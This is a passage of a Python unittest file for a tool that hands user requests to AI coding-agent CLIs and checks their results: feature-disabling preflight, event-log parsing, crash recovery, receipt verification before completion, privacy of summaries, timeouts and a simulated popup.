                stdout = 'codex-cli 0.155.1'
            elif 'features' in argv and 'list' in argv:
                value = 'false' if '--disable' in argv else 'true'
                stdout = ''.join(name + ' stable ' + value + '\n' for name in yakala.CODEX_DISABLED)
            else:
                stdout = self.HELP
            return subprocess.CompletedProcess(argv, 0, stdout.encode('utf-8'), b'')

        system = types.SimpleNamespace(**{**vars(os), 'name': 'posix'})
        with patch.object(yakala, 'os', system), patch.object(yakala.subprocess, 'run', side_effect=run):
            self.assertEqual(yakala._agent_preflight('codex', ['codex'], self.vault), ('node_repl',))
        listing = [argv for argv in calls if 'list' in argv and 'features' not in argv]
        for feature in ('plugins', 'unified_exec', 'computer_use'):
            self.assertTrue(all(feature in argv for argv in listing), feature)

    def test_unsafe_mcp_name_is_refused_not_quoted(self):
        for name in ('a.b', 'x y', 'yakala', ''):
            with self.subTest(name=name), self.assertRaises(ValueError):
                self.invoke(mcp=json.dumps([{'name': name, 'enabled': True}]))

    def test_codex_command_disables_every_bypass_feature_and_named_servers(self):
        self.configure('codex')
        result, job, card = self.queued(url='https://example.com/post')
        job['codex_mcp_off'] = ['node_repl']
        with patch.object(yakala, '_agent_executable', return_value=['codex']):
            argv = yakala._agent_command(self.vault, self.state, job, job['config'])
        for feature in yakala.CODEX_DISABLED:
            self.assertIn(feature, argv)
        self.assertIn('mcp_servers.node_repl.enabled=false', argv)
        self.assertLess(argv.index('mcp_servers.node_repl.enabled=false'), argv.index('exec'))

    def test_unsupported_cli_does_not_silently_drop_required_flags(self):
        for client, output in (('codex', 'Usage: old-codex exec PROMPT'),
                               ('claude', '2.1.258 (Claude Code)'), ('claude', 'unexpected version output')):
            with self.subTest(client=client, output=output), self.assertRaises((ValueError, RuntimeError, OSError)):
                self.invoke(client=client, help_text=output)


class AgentEventsTest(AgentFiles):
    def events(self, client, rows):
        path = Path(self.tmp.name) / 'agent.log'
        path.write_text('\n'.join(row if isinstance(row, str) else json.dumps(row, ensure_ascii=False)
                                  for row in rows) + '\n', encoding='utf-8')
        return yakala._agent_events(path, client)

    def test_claude_success_reports_the_actual_session(self):
        session = str(uuid.uuid4())
        result = self.events('claude', [{'type': 'result', 'subtype': 'success', 'is_error': False,
                                         'session_id': session, 'result': 'İşlem tamam.'}])
        self.assertEqual(result['session_id'], session)
        self.assertTrue(result['ok'])
        self.assertFalse(result['denied'])

    def test_claude_error_result_reports_its_reason_not_the_subtype(self):
        # Real Claude Code 2.1.x: a usage limit ends with subtype 'success', is_error true.
        result = self.events('claude', [{'type': 'result', 'subtype': 'success', 'is_error': True,
                                         'session_id': str(uuid.uuid4()),
                                         'result': "You've hit your session limit"}])
        self.assertFalse(result['ok'])
        self.assertEqual(result['error'], "You've hit your session limit")

    def test_claude_result_error_is_not_a_success(self):
        result = self.events('claude', [{'type': 'result', 'subtype': 'error_during_execution', 'is_error': True,
                                         'session_id': str(uuid.uuid4()), 'errors': ['limit exceeded']}])
        self.assertFalse(result['ok'])
        self.assertTrue(result['error'])

    def test_claude_permission_denial_is_retained_even_with_final_text(self):
        result = self.events('claude', [{'type': 'result', 'subtype': 'success', 'is_error': False,
                                         'session_id': str(uuid.uuid4()), 'result': 'İzin gerekli.',
                                         'permission_denials': [{'tool_name': 'Bash', 'tool_input': {}}]}])
        self.assertTrue(result['denied'])

    def test_codex_thread_started_and_completed_are_parsed_from_jsonl(self):
        session = str(uuid.uuid4())
        result = self.events('codex', ['worker header', {'type': 'thread.started', 'thread_id': session},
                                       {'type': 'turn.started'},
                                       {'type': 'item.completed', 'item': {'type': 'agent_message', 'text': 'Tamam.'}},
                                       {'type': 'turn.completed', 'usage': {'input_tokens': 3, 'output_tokens': 2}}])
        self.assertEqual(result['session_id'], session)
        self.assertTrue(result['ok'])

    def test_codex_failed_turn_never_becomes_success(self):
        result = self.events('codex', [{'type': 'thread.started', 'thread_id': str(uuid.uuid4())},
                                       {'type': 'turn.failed', 'error': {'message': 'Rate limit exceeded'}}])
        self.assertFalse(result['ok'])
        self.assertTrue(result['error'])

    def test_unstructured_or_truncated_log_is_not_proof_of_success(self):
        for client in ('claude', 'codex'):
            with self.subTest(client=client):
                result = self.events(client, ['Everything succeeded!', '{"type": "result",'])
                self.assertFalse(result['ok'])
                self.assertFalse(result['session_id'])


class AgentRecoveryTest(AgentFiles):
    def test_failed_wakeup_does_not_overwrite_a_job_claimed_by_another_worker(self):
        self.configure()
        saved, original = self.card()

        def claimed_before_failure(vault, state):
            current = yakala.find_card(vault, saved['id'], state)
            job = yakala._agent_load_job(vault, state, current['meta']['ajan_isi'])
            job.update(state='running', agent_pid=4321)
            yakala._agent_json(yakala._agent_job_dir(vault, state, job['id']) / 'job.json', job)
            yakala._agent_update_card(vault, job, 'ajanda', ajan_asama='calisiyor')
            raise OSError('Only the redundant wake-up process failed')

        self.spawned.side_effect = claimed_before_failure
        result = yakala.enqueue_agent(self.vault, self.state, saved['id'], 'Kaynağı işle.')
        job = yakala._agent_load_job(self.vault, self.state, result['job_id'])
        card = yakala.find_card(self.vault, saved['id'], self.state)
        self.assertEqual(job['state'], 'running')
        self.assertEqual(job['agent_pid'], 4321)
        self.assertEqual(card['meta']['durum'], 'ajanda')
        self.assertEqual(card['meta']['ajan_asama'], 'calisiyor')

    def test_claude_exit_zero_cannot_finalize_without_an_observed_session_id(self):
        self.configure()
        result, job, original = self.queued()
        self.assertTrue(job['session_id'])  # A planned identity is not proof that this CLI used it.
        folder = yakala._agent_job_dir(self.vault, self.state, job['id'])
        yakala._agent_json(folder / 'result.json', {'schema': 1, 'job_id': job['id'], 'status': 'completed',
                                                  'summary': 'Unverified success', 'notes': [], 'downloads': []})
        owned = types.SimpleNamespace(process=types.SimpleNamespace(pid=4321,
                                      poll=Mock(return_value=0), wait=Mock(return_value=0)), close=Mock())

        def launch(command, **options):
            options['stdout'].write(json.dumps({'type': 'result', 'subtype': 'success',
                                               'is_error': False, 'result': 'Finished'}).encode('utf-8') + b'\n')
            return owned

        with patch.object(yakala, '_agent_executable', return_value=['fake-claude']), \
                patch.object(yakala, '_agent_preflight'), patch.object(yakala, '_agent_owned_process', side_effect=launch), \
                self.window_process_identity(owned.process.pid), \
                patch.object(yakala, '_agent_kill') as kill, \
                patch.object(yakala, '_agent_finalize', return_value=('completed', 'must not happen')) as finalize:
            yakala._agent_run_job(self.vault, self.state, job)
        finalize.assert_not_called()
        kill.assert_called_once_with(owned)
        self.assertEqual(yakala._agent_load_job(self.vault, self.state, job['id'])['state'], 'failed')
        self.assertEqual(yakala.find_card(self.vault, original['id'], self.state)['meta']['durum'], 'hata')

    def test_precommit_crash_preserves_the_card_and_does_not_block_the_next_job(self):
        self.configure()
        first, interrupted, original = self.queued(text='Interrupted preparation')
        interrupted['state'] = 'preparing'
        yakala._agent_json(yakala._agent_job_dir(self.vault, self.state, interrupted['id']) / 'job.json', interrupted)
        # Reproduce the crash between job.json creation and the card's owner/status commit.
        yakala.write_card(original['path'], original['meta'], original['body'])
        before = original['path'].read_bytes()
        second, next_job, next_card = self.queued(text='The next independent request')

        def run(vault, state, job):
            yakala._agent_end(vault, state, job, 'approval_required', 'Simulated agent stopped safely.')

        with patch.object(yakala, '_agent_run_job', side_effect=run) as run_job:
            status = yakala._agent_worker(self.vault, self.state)
        self.assertEqual(status, 0)
        self.assertEqual(run_job.call_count, 1)
        self.assertEqual(run_job.call_args.args[2]['id'], next_job['id'])
        self.assertEqual(original['path'].read_bytes(), before)
        self.assertEqual(yakala._agent_load_job(self.vault, self.state, interrupted['id'])['state'], 'approval_required')
        self.assertEqual(yakala._agent_load_job(self.vault, self.state, next_job['id'])['state'], 'approval_required')


class AgentCompleteNotesTest(AgentFiles):
    """First real runs: the model described its note in prose instead of returning write_note's path."""

    def running(self):
        self.configure()
        result, job, card = self.queued(request='Kısa bir not yaz.')
        job['state'] = 'running'
        folder = yakala._agent_job_dir(self.vault, self.state, job['id'])
        yakala._agent_prepare_runtime(self.vault, self.state, job)
        note = yakala._agent_tool_call(self.vault, self.state, job['id'], 'write_note',
                                      {'title': 'Sonuç', 'content': 'Özet metni.'})
        return job, folder, note['path']

    def manifest(self, folder):
        return json.loads((folder / 'result.json').read_text(encoding='utf-8'))

    def test_empty_notes_attach_every_note_this_job_created(self):
        job, folder, note = self.running()
        yakala._agent_tool_call(self.vault, self.state, job['id'], 'complete',
                               {'status': 'completed', 'summary': 'Not yazıldı.'})
        self.assertEqual(self.manifest(folder)['notes'], [note])

    def test_prose_in_notes_is_refused_with_how_to_fix_it(self):
        job, folder, note = self.running()
        with self.assertRaises(ValueError) as caught:
            yakala._agent_complete(self.vault, self.state, job, 'completed', 'Not yazıldı.',
                                   notes=['Sonuç notu: ' + note])
        self.assertIn('write_note', str(caught.exception))
        self.assertFalse((folder / 'result.json').exists())

    def test_exact_returned_path_is_kept(self):
        job, folder, note = self.running()
        yakala._agent_tool_call(self.vault, self.state, job['id'], 'complete',
                               {'status': 'completed', 'summary': 'Not yazıldı.', 'notes': [note]})
        self.assertEqual(self.manifest(folder)['notes'], [note])

    def test_windows_toast_tolerates_the_null_setting_of_powershell_5(self):
        source = Path(yakala.__file__).read_text(encoding='utf-8')
        self.assertNotIn('$notifier.Setting.ToString()', source)
        self.assertIn("$null -ne $setting -and [string]$setting -ne 'Enabled'", source)


class AgentFinalizationTest(AgentFiles):
    TRACK = b'ID3\x04\0\0\0\0\0\0a deterministic public test track'

    def assertNewestEntry(self, fixture):
        self.assertEqual(fixture.last.read_bytes(), fixture.last_before)
        saved = yakala._agent_load_job(self.vault, self.state, fixture.job['id'])
        self.assertNotIn('last_session', saved)
        journal = self.vault / saved['journal']
        self.assertEqual(journal.parent, fixture.card['path'].parent / 'Ajan')
        self.assertRegex(journal.name, r'^Gunluk-\d{4}-\d\d\.md$')
        text = yakala._agent_read_note(journal)
        self.assertIn('visibility: "internal"', text)
        self.assertRegex(text, r'(?m)^- \d{4}-\d\d-\d\d \d\d:\d\d · claude · ' +
                         fixture.job['session_id'][:8] + r' · (completed|approval_required)\n')
        # Resolve all actual Markdown links, including Unicode/space URL escaping.
        import re
        from urllib.parse import unquote
        targets = [(journal.parent / unquote(link)).resolve()
                   for link in re.findall(r'\[[^\]]+\]\(([^)]+)\)', text)]
        self.assertEqual(targets, [fixture.card['path'], self.vault / saved['outcome'], self.vault / saved['receipt']])
        self.assertNotIn(fixture.job['session_id'], text)  # Only the first eight characters.
        return text

    def prepared(self, download_names=('track.mp3',)):
        (self.vault / 'beyin.py').write_text('# Test receipt entry; never executed.\n', encoding='utf-8')
        memory = self.vault / 'memory'
        memory.mkdir()
        last = memory / 'Last-Session.md'
        last.write_text('# Last Session\n\nAnother session wrote this.\n', encoding='utf-8')
        other = memory / 'existing.md'
        other.write_text('Existing knowledge must not be replaced.\n', encoding='utf-8')
        self.configure(last_session_path='memory/Last-Session.md')
        result, job, card = self.queued(request='Bu parçayı indir ve kaynağını hatırla.',
                                         url='https://example.com/music', why='Kullanıcının kaynak notu.')
        job['state'] = 'running'
        yakala._agent_prepare_runtime(self.vault, self.state, job)
        note = yakala._agent_tool_call(self.vault, self.state, job['id'], 'write_note',
                                      {'title': 'Verified music', 'content': 'Public track: https://example.com/track.mp3'})

        def fetch(url, byte_limit, output):
            self.assertEqual(byte_limit, 50 * 1024 * 1024)
            output.write(self.TRACK)
            return {'url': url, 'body': None, 'bytes': len(self.TRACK), 'content_type': 'audio/mpeg',
                    'sha256': hashlib.sha256(self.TRACK).hexdigest()}

        downloads = []
        source = {'url': job['url'], 'text': 'Available tracks',
                  'links': ['https://example.com/' + name for name in download_names]}
        with patch.object(yakala, '_agent_fetch_source', return_value=source):
            yakala._agent_tool_call(self.vault, self.state, job['id'], 'fetch_source', {'url': job['url']})
        with patch.object(yakala, '_agent_public_get', side_effect=fetch):
            for filename in download_names:
                downloads.append(yakala._agent_tool_call(self.vault, self.state, job['id'], 'download',
                                 {'url': 'https://example.com/' + filename, 'filename': filename}))
        yakala._agent_tool_call(self.vault, self.state, job['id'], 'complete',
                               {'status': 'completed', 'summary': 'Kaynak doğrulandı ve dosya hazırlandı.',
                                'notes': [note['path']], 'downloads': downloads})
        return types.SimpleNamespace(job=job, card=card, card_before=card['path'].read_bytes(),
                                     last=last, last_before=last.read_bytes(), other=other, other_before=other.read_bytes(),
                                     note=note, note_before=(self.vault / note['path']).read_bytes(), downloads=downloads,
                                     target=self.downloads / ('track-yakala-' + job['id'][:8] + '.mp3'))

    def receipt_process(self, fixture, source='valid', status='succeeded'):
        """Model the probed integration contract; no beyin.py implementation is assumed or executed."""
        def run(argv, timeout, cwd=None):
            self.assertEqual(argv[1:3], [str(self.vault / 'beyin.py'), 'receipt'])
            self.assertEqual(cwd, str(self.vault))
            if '--help' in argv:
                return 0, '--file --harness --session --json', ''
            self.assertEqual(argv[argv.index('--harness') + 1], fixture.job['client'])
            self.assertNotIn('--session', argv)  # beyin.py: --file cannot be combined with receipt flags
            payload = json.loads(Path(argv[argv.index('--file') + 1]).read_text(encoding='utf-8'))
            self.assertEqual(payload['session'], fixture.job['session_id'])
            self.assertEqual(payload['event_id'], 'yakala-' + fixture.job['id'])
            self.assertIn(fixture.job['card_path'], payload['refs'])
            self.assertIn(fixture.note['path'], payload['refs'])
            reference = 'memory/receipt-' + fixture.job['id'] + '.md'
            if source != 'missing':
                text = payload['event_id'] if source == 'valid' else 'This source does not confirm that receipt.'
                with (self.vault / reference).open('x', encoding='utf-8') as output:
                    output.write('# Receipt\n\n' + text + '\n')
            response = {'event_id': payload['event_id'], 'source': reference}
            if status is not None:
                response['status'] = status
            return 0, json.dumps(response), ''
        return patch.object(yakala, '_run', side_effect=run)

    def successful_cli(self, fixture):
        owned = types.SimpleNamespace(process=types.SimpleNamespace(pid=4321,
                                      poll=Mock(return_value=0), wait=Mock(return_value=0)), close=Mock())

        def launch(command, **options):
            self.assertNotIn(fixture.job['request'], command)
            self.assertIn(fixture.job['request'], options['stdin'].read().decode('utf-8'))
            event = {'type': 'result', 'subtype': 'success', 'is_error': False,
                     'session_id': fixture.job['session_id'], 'result': 'Finished'}
            options['stdout'].write(json.dumps(event).encode('utf-8') + b'\n')
            return owned
        return owned, launch

    def test_success_publishes_exact_bytes_and_verified_memory_before_card_completion(self):
        fixture = self.prepared()
        with self.receipt_process(fixture) as receipt:
            terminal, summary = yakala._agent_finalize(self.vault, self.state, fixture.job)
        self.assertEqual(terminal, 'completed')
        self.assertEqual(receipt.call_count, 2)
        self.assertEqual(fixture.target.read_bytes(), self.TRACK)
        self.assertEqual(fixture.card['path'].read_bytes(), fixture.card_before)
        saved = yakala._agent_load_job(self.vault, self.state, fixture.job['id'])
        self.assertEqual(saved['published'][0]['sha256'], hashlib.sha256(self.TRACK).hexdigest())
        self.assertEqual(saved['published'][0]['path'], str(fixture.target))
        self.assertEqual(saved['published'][0]['source_url'], 'https://example.com/track.mp3')
        self.assertTrue((self.vault / saved['outcome']).is_file())
        self.assertIn('yakala-' + fixture.job['id'], (self.vault / saved['receipt']).read_text(encoding='utf-8'))
        journal = self.assertNewestEntry(fixture)
        self.assertEqual(journal.count('<!-- yakala-ajan:' + fixture.job['id'] + ' -->'), 1)
        self.assertNotIn(summary, journal)
        self.assertEqual(fixture.other.read_bytes(), fixture.other_before)
        self.assertEqual((self.vault / fixture.note['path']).read_bytes(), fixture.note_before)
        yakala._agent_end(self.vault, self.state, fixture.job, terminal, summary)
        card = yakala.find_card(self.vault, fixture.card['id'], self.state)
        self.assertEqual(card['meta']['durum'], 'islendi')
        self.assertEqual(card['meta']['ajan_receipt'], saved['receipt'])
        self.assertEqual(card['body'], fixture.card['body'])

    def assertSummaryOmitted(self, visibility):
        fixture = self.prepared(download_names=())
        meta = dict(fixture.card['meta'], visibility=visibility)
        fixture.card['path'].write_text(yakala._dump(meta, fixture.card['body']), encoding='utf-8')
        folder = yakala._agent_job_dir(self.vault, self.state, fixture.job['id'])
        manifest = json.loads((folder / 'result.json').read_text(encoding='utf-8'))
        manifest['summary'] = 'PRIVATE_SUMMARY_CANARY: ad, adres ve ozel sonuc.'
        yakala._agent_json(folder / 'result.json', manifest)
        with self.receipt_process(fixture):
            yakala._agent_finalize(self.vault, self.state, fixture.job)
        journal = self.assertNewestEntry(fixture)
        self.assertNotIn('PRIVATE_SUMMARY_CANARY', journal)
        self.assertNotIn(fixture.job['request'], journal)
        self.assertNotIn(fixture.job['url'], journal)
        outcome = self.vault / fixture.job['outcome']
        self.assertIn('PRIVATE_SUMMARY_CANARY', yakala._agent_read_note(outcome, own=True))
        with self.assertRaisesRegex(ValueError, 'private'):
            yakala._agent_read_note(outcome)

    def test_private_card_summary_stays_in_private_result_and_out_of_journal(self):
        self.assertSummaryOmitted('private')

    def test_internal_card_can_also_have_a_private_summary(self):
        self.assertSummaryOmitted('internal')

    def test_change_seen_before_replace_keeps_the_other_writer_and_adds_no_entry(self):
        # Accepted residual risk (documented): a write landing after this check and before
        # os.replace is lost; there is no portable compare-and-swap for tools without our lock.
        fixture = self.prepared(download_names=())
        journal = fixture.card['path'].parent / 'Ajan' / ('Gunluk-' + yakala.now().strftime('%Y-%m') + '.md')
        journal.write_bytes(b'# Agent journal\r\n\r\nAn earlier entry.\r\n')
        concurrent = journal.read_bytes() + b'Concurrent editor: important new decision.\r\n'
        original = yakala._agent_insert_journal

        def insert(before, card):
            journal.write_bytes(concurrent)
            return original(before, card)

        with self.receipt_process(fixture), patch.object(yakala, '_agent_insert_journal', side_effect=insert), \
                self.assertRaises(ValueError):
            yakala._agent_finalize(self.vault, self.state, fixture.job)
        self.assertEqual(journal.read_bytes(), concurrent)
        self.assertEqual(fixture.last.read_bytes(), fixture.last_before)
        saved = yakala._agent_load_job(self.vault, self.state, fixture.job['id'])
        self.assertTrue((self.vault / saved['outcome']).is_file())
        self.assertTrue((self.vault / saved['receipt']).is_file())
        self.assertNotIn('journal', saved)

    def test_unverified_receipt_keeps_outputs_and_never_overwrites_prior_memory(self):
        fixture = self.prepared()
        with self.receipt_process(fixture, source='wrong-event'), self.assertRaises(ValueError):
            yakala._agent_finalize(self.vault, self.state, fixture.job)
        self.assertEqual(fixture.target.read_bytes(), self.TRACK)
        self.assertEqual(fixture.card['path'].read_bytes(), fixture.card_before)
        self.assertEqual(fixture.last.read_bytes(), fixture.last_before)
        self.assertEqual(fixture.other.read_bytes(), fixture.other_before)
        self.assertEqual((self.vault / fixture.note['path']).read_bytes(), fixture.note_before)
        saved = yakala._agent_load_job(self.vault, self.state, fixture.job['id'])
        self.assertNotEqual(saved['state'], 'completed')
        self.assertFalse(saved.get('receipt'))
        self.assertTrue(saved.get('outcome'))
        self.assertIn(json.dumps(str(fixture.target), ensure_ascii=False),
                      (self.vault / saved['outcome']).read_text(encoding='utf-8'))

    def test_receipt_status_cannot_be_inferred_only_from_its_event_and_source(self):
        fixture = self.prepared()
        with self.receipt_process(fixture, status=None), self.assertRaises(ValueError):
            yakala._agent_finalize(self.vault, self.state, fixture.job)
        self.assertEqual(fixture.card['path'].read_bytes(), fixture.card_before)
        self.assertEqual(fixture.last.read_bytes(), fixture.last_before)
        self.assertNotEqual(yakala._agent_load_job(self.vault, self.state, fixture.job['id'])['state'], 'completed')

    def test_unknown_receipt_status_is_not_treated_as_verified_success(self):
        (self.vault / 'beyin.py').write_text('# Test receipt entry; never executed.\n', encoding='utf-8')
        (self.vault / 'memory').mkdir()
        self.configure()
        for status in ('queued', 'timeout', 'unknown', 'approval_required', 'onay-bekliyor', 'success', ' Recorded '):
            with self.subTest(status=status):
                # Every adapter call has a distinct event/source, with a real
                # saved capture and job but no runtime/model subprocess.
                _, job, _ = self.queued(text='Receipt status ' + status)
                fixture = types.SimpleNamespace(job=job, note={'path': job['card_path']})
                refs = [fixture.job['card_path'], fixture.note['path']]
                with self.receipt_process(fixture, status=status), self.assertRaises(ValueError):
                    yakala._agent_receipt(self.vault, self.state, fixture.job, 'Check pending status', refs)

    def test_partial_publication_preserves_existing_target_and_records_actual_effects(self):
        fixture = self.prepared(download_names=('track.mp3', 'existing.mp3'))
        conflict = self.downloads / ('existing-yakala-' + fixture.job['id'][:8] + '.mp3')
        existing = b'An existing download belongs to the user.'
        conflict.write_bytes(existing)
        with self.receipt_process(fixture) as receipt:
            terminal, summary = yakala._agent_finalize(self.vault, self.state, fixture.job)
        self.assertEqual(terminal, 'approval_required')
        self.assertEqual(receipt.call_count, 2)
        self.assertEqual(fixture.target.read_bytes(), self.TRACK)
        self.assertEqual(conflict.read_bytes(), existing)
        self.assertEqual(fixture.card['path'].read_bytes(), fixture.card_before)
        folder = yakala._agent_job_dir(self.vault, self.state, fixture.job['id'])
        self.assertEqual((folder / 'downloads/track.mp3').read_bytes(), self.TRACK)
        saved = yakala._agent_load_job(self.vault, self.state, fixture.job['id'])
        self.assertEqual([item['path'] for item in saved['published']], [str(fixture.target)])
        self.assertEqual(saved['published'][0]['sha256'], hashlib.sha256(self.TRACK).hexdigest())
        outcome = (self.vault / saved['outcome']).read_text(encoding='utf-8')
        self.assertIn('approval_required', outcome)
        self.assertIn(json.dumps(str(fixture.target), ensure_ascii=False), outcome)
        payload = json.loads((folder / 'receipt.json').read_text(encoding='utf-8'))
        self.assertIn('approval_required', payload['summary'])
        self.assertIn(saved['outcome'], payload['refs'])
        journal = self.assertNewestEntry(fixture)
        self.assertIn('approval_required', journal)
        partial = conflict.with_name(conflict.name + '.part')
        self.assertEqual(partial.read_bytes(), self.TRACK)
        self.assertEqual([entry['state'] for entry in saved['publication_intents']], ['published', 'copying'])
        self.assertEqual(saved['publication_intents'][1]['partial'], str(partial))
        self.assertIn(json.dumps(str(partial), ensure_ascii=False), outcome)
        self.assertEqual({path.name for path in self.downloads.iterdir()},
                         {fixture.target.name, conflict.name, partial.name})
        yakala._agent_end(self.vault, self.state, fixture.job, terminal, summary)
        self.assertEqual(yakala.find_card(self.vault, fixture.card['id'], self.state)['meta']['durum'], 'onay-bekliyor')

    def test_exit_zero_and_complete_without_a_verified_receipt_are_not_completion(self):
        fixture = self.prepared()
        owned, launch = self.successful_cli(fixture)
        with patch.object(yakala, '_agent_executable', return_value=['fake-claude']), \
                patch.object(yakala, '_agent_preflight'), patch.object(yakala, '_agent_owned_process', side_effect=launch), \
                self.window_process_identity(owned.process.pid), \
                patch.object(yakala, '_agent_kill') as kill, patch.object(yakala, '_agent_notify') as notify, \
                self.receipt_process(fixture, source='missing'):
            yakala._agent_run_job(self.vault, self.state, fixture.job)
        kill.assert_called_once_with(owned)
        saved = yakala._agent_load_job(self.vault, self.state, fixture.job['id'])
        self.assertEqual(saved['state'], 'approval_required')
        card = yakala.find_card(self.vault, fixture.card['id'], self.state)
        self.assertEqual(card['meta']['durum'], 'onay-bekliyor')
        self.assertEqual(card['body'], fixture.card['body'])
        self.assertNotIn('completed', [call.args[2] for call in notify.call_args_list])
        self.assertEqual(notify.call_args_list, [
            mock.call(self.state, fixture.job['card_id'], 'started', fixture.job['card_path'], vault=self.vault),
            mock.call(self.state, fixture.job['card_id'], 'approval', fixture.job['card_path'], vault=self.vault)])
        self.assertEqual(fixture.last.read_bytes(), fixture.last_before)
        self.assertEqual(fixture.target.read_bytes(), self.TRACK)

    def test_timeout_closes_the_owned_process_tree_before_recording_terminal_status(self):
        self.configure(timeout_seconds=30)
        result, job, card = self.queued()
        observed = []
        owned = types.SimpleNamespace(process=types.SimpleNamespace(pid=4321,
                                      poll=Mock(return_value=None), wait=Mock()),
                                      close=Mock(side_effect=lambda: observed.append('tree-closed')))
        original_end = yakala._agent_end

        def record_end(*args):
            observed.append('terminal-recorded')
            return original_end(*args)

        # Model the Windows job's close boundary, without loading Win32 or signalling a real PID.
        system = types.SimpleNamespace(**{**vars(os), 'name': 'nt'})
        platform = types.SimpleNamespace(**{**vars(sys), 'platform': 'unit-test'})
        worker_identity = yakala._agent_process_identity(os.getpid())
        with patch.object(yakala, 'os', system), patch.object(yakala, 'sys', platform), \
                patch.object(yakala, '_agent_executable', return_value=['fake-claude']), \
                patch.object(yakala, '_agent_process_identity', return_value=worker_identity), \
                patch.object(yakala, '_agent_preflight'), patch.object(yakala, '_agent_owned_process', return_value=owned), \
                patch('time.monotonic', side_effect=[0, 31]), patch.object(yakala, '_agent_end', side_effect=record_end):
            yakala._agent_run_job(self.vault, self.state, job)
        self.assertEqual(observed, ['tree-closed', 'terminal-recorded'])
        owned.close.assert_called_once()
        owned.process.wait.assert_not_called()
        saved = yakala._agent_load_job(self.vault, self.state, job['id'])
        self.assertEqual(saved['state'], 'failed')
        self.assertIn('TimeoutError', saved['result_summary'])
        self.assertEqual(yakala.find_card(self.vault, card['id'], self.state)['meta']['durum'], 'hata')


class _Widget:
    """The existing pane tests use this same small scripted Tk boundary."""

    def __getattr__(self, name):
        if name.startswith('__'):
            raise AttributeError(name)
        return lambda *args, **options: None


class _PopupRoot(_Widget):
    def __init__(self, script):
        self.script, self.bound, self.timers, self.key_results = script, {}, [], {}
        self.alive = True

    def bind(self, sequence, handler, add=None):
        self.bound[sequence] = handler

    def after(self, delay, handler, *args):
        self.timers.append((handler, args))

    def winfo_screenwidth(self):
        return 1440

    def winfo_screenheight(self):
        return 900

    def destroy(self):
        self.alive = False

    def mainloop(self):
        for action, value in self.script:
            if action == 'key':
                # Tk falls back to an unmodified Return binding if a more specific one is absent.
                handler = self.bound.get(value)
                if handler is None and value == '<Control-Return>':
                    handler = self.bound['<Return>']
                self.key_results[value] = handler(None)
            elif action == 'type':
                self.entry.type(value)
        for _ in range(400):
            if not (self.alive and self.timers):
                break
            handler, args = self.timers.pop(0)
            handler(*args)


class _PopupEntry(_Widget):
    def __init__(self, root, **options):
        self.text, self.handlers = '', {}
        root.entry = self

    def bind(self, sequence, handler, add=None):
        self.handlers[sequence] = handler

    def delete(self, first, last=None):
        self.text = ''

    def insert(self, index, text):
        self.text += text

    def get(self):
        return self.text

    def type(self, text):
        self.handlers['<KeyPress>'](types.SimpleNamespace(char=text[0], keysym=text[0]))
        self.insert('end', text)
        self.handlers['<KeyRelease>'](None)


class _PopupCanvas(_Widget):
    def __init__(self, root, **options):
        self.items = {}
        root.canvas = self

    def _create(self, *coordinates, **options):
        self.items[len(self.items) + 1] = dict(options)
        return len(self.items)

    create_text = create_polygon = create_oval = create_line = create_window = create_image = _create

    def itemconfigure(self, item, **options):
        self.items[item].update(options)


def _host_lock_for_simulated_linux():
    """The popup is simulated as Linux; on a Windows host flock is missing, so a plain lock stands in."""
    if os.name != 'nt':
        return contextlib.nullcontext()
    locks, guard = {}, threading.Lock()

    class HostLock:
        def __init__(self, path):
            with guard:
                self.lock = locks.setdefault(str(path), threading.RLock())

        def __enter__(self):
            self.lock.acquire()
            return self

        def __exit__(self, *_):
            self.lock.release()

    enqueue = yakala.enqueue_agent

    def host_enqueue(*args, **kwargs):
        # Queue files are host files: a simulated Linux would fsync directories Windows refuses to open.
        with patch.object(yakala, 'os', os), patch.object(yakala, 'sys', sys):
            return enqueue(*args, **kwargs)
    stack = contextlib.ExitStack()
    stack.enter_context(patch.object(yakala, '_AgentFileLock', HostLock))
    stack.enter_context(patch.object(yakala, 'enqueue_agent', host_enqueue))
    return stack


class AgentPopupTest(AgentFiles):
    def popup(self, script):
        root = _PopupRoot(script)
        fake = types.ModuleType('tkinter')
        fake.Tk = lambda: root
        fake.Canvas, fake.Entry, fake.TclError = _PopupCanvas, _PopupEntry, RuntimeError
        fake.font = types.ModuleType('tkinter.font')
        fake.font.Font = lambda **options: types.SimpleNamespace(measure=lambda text: len(text) * 6)
        system = types.SimpleNamespace(**{**vars(os), 'name': 'posix'})
        platform = types.SimpleNamespace(**{**vars(sys), 'platform': 'linux'})
        with patch.dict(sys.modules, {'tkinter': fake, 'tkinter.font': fake.font}), \
                patch.object(yakala, 'os', system), patch.object(yakala, 'sys', platform), \
                patch.dict(os.environ, {'BEYIN_YAKALA_SNAPSHOT': ''}), \
                _host_lock_for_simulated_linux(), \
                patch.object(yakala, '_clipboard', return_value=''), \
                patch.object(yakala, 'clipboard_image', return_value=None), \
                patch.object(yakala, '_window_chrome'), \
                patch.object(yakala, '_font', side_effect=lambda size, weight='normal': ('Segoe UI', size, weight)):
            result = yakala.popup(self.vault, {}, state=self.state)
        return result, root

    def test_ctrl_enter_preserves_a_request_without_any_selected_source(self):
        self.configure()
        request = 'Yarınki planım için yeni bir not oluştur.'
        result, root = self.popup([('type', request), ('key', '<Control-Return>')])
        card = yakala.find_card(self.vault, result['id'], self.state)
        job = yakala._agent_load_job(self.vault, self.state, card['meta']['ajan_isi'])
        self.assertEqual(job['request'], request)
        self.assertIn(request, card['body'])
        self.assertEqual(card['meta']['durum'], 'ajanda')
        self.assertEqual(root.key_results['<Control-Return>'], 'break')
        self.spawned.assert_called_once()

    def test_disabled_ctrl_enter_does_not_fall_through_to_plain_save(self):
        result, root = self.popup([('type', 'Bu yalnızca yazılan metin.'),
                                   ('key', '<Control-Return>'), ('key', '<Escape>')])
        self.assertEqual(result['status'], 'vazgecildi')
        self.assertEqual(yakala.pending(self.vault, self.state), 0)
        self.assertEqual(root.key_results['<Control-Return>'], 'break')
        self.spawned.assert_not_called()

    def test_escape_blocks_pending_return_events_during_close_animation(self):
        self.configure()
        for key in ('<Return>', '<Control-Return>'):
            with self.subTest(key=key):
                # Tk can deliver another already-queued key before the next
                # 10 ms fade timer. Escape is cancellation at that point.
                result, root = self.popup([('type', 'İptal edilen istek.'),
                                           ('key', '<Escape>'), ('key', key)])
                self.assertEqual(result['status'], 'vazgecildi')
                self.assertEqual(yakala.pending(self.vault, self.state), 0)
                self.assertEqual(root.key_results[key], 'break')
                self.spawned.assert_not_called()


class AgentWorkerLaunchTest(AgentFiles):
    def launch(self, windows=False, failure=None):
        # Stop the queue-level mock; exercise only the detached Popen boundary here.
